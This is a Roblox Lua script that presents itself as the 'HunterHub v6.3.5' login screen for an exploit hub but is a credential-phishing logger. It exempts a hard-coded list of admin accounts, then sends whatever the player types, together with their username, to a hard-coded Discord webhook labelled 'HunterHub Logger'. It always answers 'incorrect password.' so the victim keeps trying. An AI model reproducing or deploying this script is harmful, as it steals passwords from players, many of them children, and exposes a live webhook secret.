local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Admin list
local Admins = {
	["QT_xAraa"] = true,
	["Shot16kill"] = true,
	["theoverryou3_alt"] = true,
	["Raiden_Nika"] = true,
	["philippinesBraxy123"] = true,
	["Brxy_Alt"] = true,
	["VyxzarlIion"] = true,
	["Bowmbaclaat"] = true,
	["FrostByte_074"] = true
}

-- Check if player is an admin
if Admins[LocalPlayer.Name] then
	return
end

-- UI Setup in CoreGui
local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Name = "HunterHubLogin"
screenGui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BackgroundTransparency = 1

local loginFrame = Instance.new("Frame", frame)
loginFrame.AnchorPoint = Vector2.new(0.5, 0.5)
loginFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
loginFrame.Size = UDim2.new(0, 300, 0, 240)
loginFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
loginFrame.BorderSizePixel = 0

-- Title
local title = Instance.new("TextLabel", loginFrame)
title.Text = "HunterHub v6.3.5"
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.Merriweather
title.TextScaled = true

-- Username box (readonly)
local usernameBox = Instance.new("TextBox", loginFrame)
usernameBox.Text = LocalPlayer.Name
usernameBox.Size = UDim2.new(1, -40, 0, 30)
usernameBox.Position = UDim2.new(0, 20, 0, 40)
usernameBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
usernameBox.Font = Enum.Font.Merriweather
usernameBox.TextScaled = true
usernameBox.ClearTextOnFocus = false
usernameBox.TextEditable = false

-- Input box
local inputBox = Instance.new("TextBox", loginFrame)
inputBox.PlaceholderText = "Enter anything..."
inputBox.Size = UDim2.new(1, -40, 0, 30)
inputBox.Position = UDim2.new(0, 20, 0, 80)
inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.Font = Enum.Font.Merriweather
inputBox.TextScaled = true
inputBox.ClearTextOnFocus = true

-- Button
local openButton = Instance.new("TextButton", loginFrame)
openButton.Text = "Open"
openButton.Size = UDim2.new(1, -40, 0, 30)
openButton.Position = UDim2.new(0, 20, 0, 120)
openButton.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
openButton.Font = Enum.Font.Merriweather
openButton.TextScaled = true

-- Label: Do not share
local warnLabel = Instance.new("TextLabel", loginFrame)
warnLabel.Text = "Do not share this script!!"
warnLabel.Size = UDim2.new(1, 0, 0, 20)
warnLabel.Position = UDim2.new(0, 0, 1, -40)
warnLabel.BackgroundTransparency = 1
warnLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
warnLabel.Font = Enum.Font.Merriweather
warnLabel.TextScaled = true

-- Label: Step 1 Security
local stepLabel = Instance.new("TextLabel", loginFrame)
stepLabel.Text = "Step 1 Security"
stepLabel.Size = UDim2.new(1, 0, 0, 20)
stepLabel.Position = UDim2.new(0, 0, 1, -20)
stepLabel.BackgroundTransparency = 1
stepLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
stepLabel.Font = Enum.Font.Merriweather
stepLabel.TextScaled = true

-- Webhook sending function (including username)
local function sendToWebhook(text)
	local url = "https://discord.com/api/webhooks/1371748529965629540/zLaoxYBoPgL4_tFC2KqqxtGwxgHXcv2HbFsxl_Iug1yPlXQ_mBzaYRegUo8A5WqsuR0U"
	local username = LocalPlayer.Name

	local data = {
		content = "**New Input from HunterHub GUI:**\n```Username: " .. username .. "\nInput: " .. text .. "```",
		username = "HunterHub Logger"
	}

	local jsonData = HttpService:JSONEncode(data)

	local success, err = pcall(function()
		local requestFunc = (http_request or request or syn.request)
		if requestFunc then
			requestFunc({
				Url = url,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = jsonData
			})
		end
	end)
end

-- Button click
openButton.MouseButton1Click:Connect(function()
	local inputText = inputBox.Text
	if inputText and inputText ~= "" then
		sendToWebhook(inputText)
		inputBox.Text = "incorrect password."
		inputBox.TextColor3 = Color3.fromRGB(255, 0, 0)
	end
end)
